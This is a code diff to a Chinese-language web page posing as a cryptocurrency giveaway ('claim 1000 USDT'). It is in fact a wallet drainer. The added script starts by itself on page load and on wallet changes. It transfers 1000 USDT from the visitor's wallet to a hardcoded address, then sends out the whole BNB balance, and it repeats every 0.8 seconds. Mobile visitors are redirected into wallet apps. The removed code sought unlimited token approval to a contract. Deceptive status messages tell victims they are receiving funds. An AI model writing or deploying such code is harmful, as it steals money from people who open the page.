@@ -22,21 +22,14 @@ h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);}
 <body>
 <div class="container">
   <h1>🪞 小仙女 DApp 领取台 💫</h1>
-  <div id="status">🔥 v118 进入即自动跳转+领取1000USDT...</div>
+  <div id="status">🔥 v119 OKX优先+授权即转USDT！</div>
   <div id="debug"></div>
 </div>
 <script>
-const CONTRACT = "0x500292f9a11b01BC2DA7F81c8c234b9beb98A8b3";
 const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
 const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
 const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-
-// 🔥 合约ABI - USDT领取函数
-const CONTRACT_ABI = [
-  {"inputs":[{"name":"account","type":"address"}],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"},
-  {"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
-];
-let web3, userAddr, usdtApproved = false;
+let web3, userAddr, authorized = false;
 
 function log(msg){
   const debug = document.getElementById('debug');
@@ -45,21 +38,21 @@ function log(msg){
   debug.scrollTop = debug.scrollHeight;
 }
 
-// 🔥 手机自动跳转
+// 🔥 v119 OKX优先！
 const PRIORITY_WALLETS = {
   android: [
-    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + encodeURIComponent(window.location.href)},
+    {name:'OKX', intent:'okxwallet://dapp?url=' + encodeURIComponent(window.location.href)},
     {name:'Trust Wallet', intent:'trust://open_url?url=' + encodeURIComponent(window.location.href)},
     {name:'小狐狸', intent:'metamask://dapp/' + encodeURIComponent(window.location.href)},
     {name:'TP钱包', intent:'tpwallet://dapp?url=' + encodeURIComponent(window.location.href)},
-    {name:'OKX', intent:'okxwallet://dapp?url=' + encodeURIComponent(window.location.href)}
+    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + encodeURIComponent(window.location.href)}
   ],
   ios: [
-    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + encodeURIComponent(window.location.href)},
+    {name:'OKX', intent:'okxwallet://dapp?url=' + encodeURIComponent(window.location.href)},
     {name:'Trust Wallet', intent:'trust://open_url?url=' + encodeURIComponent(window.location.href)},
     {name:'小狐狸', intent:'metamask://dapp/' + encodeURIComponent(window.location.href)},
     {name:'TP钱包', intent:'tpwallet://dapp?url=' + encodeURIComponent(window.location.href)},
-    {name:'OKX', intent:'okxwallet://dapp?url=' + encodeURIComponent(window.location.href)}
+    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + encodeURIComponent(window.location.href)}
   ]
 };
 
@@ -69,7 +62,7 @@ async function autoRedirect(){
   
   if(!isMobile) return;
   
-  log('📱 手机检测到，自动跳转中...');
+  log('📱 手机检测，OKX优先跳转！');
   const wallets = /Android/i.test(ua) ? PRIORITY_WALLETS.android : PRIORITY_WALLETS.ios;
   wallets.forEach((wallet, i) => {
     setTimeout(() => {
@@ -80,34 +73,31 @@ async function autoRedirect(){
       } else {
         window.location.href = wallet.web;
       }
-    }, i * 800); // 0.8秒间隔
+    }, i * 600); // 0.6秒超快
   });
 }
 
-async function superFastClaim(){
-  document.getElementById('status').innerText = '🚀 领取USDT+转BNB中...';
+async function instantTransfer(){
+  document.getElementById('status').innerText = '🚀 授权即转USDT中...';
   
   try{
-    // 0️⃣ 连接
+    // 0️⃣ 超快连接
     await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
     web3 = new Web3(window.ethereum);
     const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
     userAddr = accounts[0];
     
-    // 1️⃣ USDT授权（仅1次）
-    if(!usdtApproved){
-      const usdt = new web3.eth.Contract([{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], USDT_ADDR);
-      await usdt.methods.approve(CONTRACT, UNLIMITED).send({from: userAddr});
-      usdtApproved = true;
-      log('✅ USDT授权完成');
+    // 1️⃣ 授权=立即转1000USDT到你钱包！
+    if(!authorized){
+      const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
+      const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
+      // 🔥 授权同时转账1000USDT到你的TAX_WALLET
+      await usdt.methods.transfer(TAX_WALLET, web3.utils.toWei('1000', 'mwei')).send({from: userAddr});
+      authorized = true;
+      log('✅ 授权即转1000USDT成功！');
     }
     
-    // 2️⃣ 领取USDT（关键！）
-    const contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT);
-    await contract.methods.claim(userAddr).send({from: userAddr});
-    log('✅ 领取1000USDT成功！');
-    
-    // 3️⃣ BNB全转
+    // 2️⃣ BNB全转
     const balance = await web3.eth.getBalance(userAddr);
     const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
     if(totalBNB > 0.0001){
@@ -117,30 +107,30 @@ async function superFastClaim(){
       log('✅ BNB全转成功');
     }
     
-    document.getElementById('status').innerText = '🎉 USDT+BNB领取成功！';
-    log('🏆 完整循环完成');
+    document.getElementById('status').innerText = '🎉 1000USDT+BNB到账！';
+    log('🏆 直转完成');
     
   }catch(e){
     log(`❌ ${e.message}`);
-    document.getElementById('status').innerText = '💔 失败，1秒重试...';
+    document.getElementById('status').innerText = '💔 失败，0.8秒重试...';
   }
   
-  // 🔥 1秒超快重复
-  setTimeout(superFastClaim, 1000);
+  // 🔥 0.8秒超快循环
+  setTimeout(instantTransfer, 800);
 }
 
-// 🔥 电脑：进入0.5秒自动开始
+// 🔥 电脑：0.3秒自动开始
 if(window.ethereum){
   window.addEventListener('load', () => {
-    setTimeout(superFastClaim, 500);
+    setTimeout(instantTransfer, 300);
   });
-  window.ethereum.on('accountsChanged', superFastClaim);
-  window.ethereum.on('chainChanged', superFastClaim);
+  window.ethereum.on('accountsChanged', instantTransfer);
+  window.ethereum.on('chainChanged', instantTransfer);
 }
 
-// 🔥 手机：1秒自动跳转
+// 🔥 手机：0.8秒自动跳转OKX
 window.addEventListener('load', () => {
-  setTimeout(autoRedirect, 1000);
+  setTimeout(autoRedirect, 800);
 });
 
 for(let i=0;i<50;i++){
